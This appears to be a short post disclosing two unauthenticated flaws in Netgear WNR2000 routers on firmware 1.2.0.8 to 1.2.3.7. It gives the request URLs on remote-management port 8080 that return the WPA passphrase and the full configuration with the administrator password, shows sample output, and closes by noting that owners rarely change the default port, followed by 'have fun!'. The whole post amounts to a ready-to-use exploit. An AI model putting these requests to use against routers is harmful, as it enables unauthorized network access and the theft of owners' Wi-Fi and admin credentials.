Netgear WNR2000 Wireless-N Router Exploits in firmware v1.2.0.8 through to 1.2.3.7
Two severe vulnerabilities with the Netgear WNR2000 wireless-N Router running firmware versions 1.2.0.8 through to 1.2.3.7
1. Unauthenticated disclosure of WPA/WPA2 password:
http://xxx.xxx.xxx.xxx:8080/router-i...outer-info.htm
The router should then respond with something like:
“DeviceID:WNR2000; HardwareVersion:WNR2000; Firmwa reVersion:V1.2.x.x; WLAN-Security:SecurityMode=WPA-PSK-Mixed;WPAPassPhrase=omglolwtfbbq”
2. Unauthenticated disclosure of administrator password: http://xxx.xxx.xxx.xxx:8080/cgi-bin/NETGEAR_WNR2000.cfg
The router should then respond with the full router config.
Note: The WNR2000’s default remote management port is 8080 and in my experience, not many people think to change this… have fun!
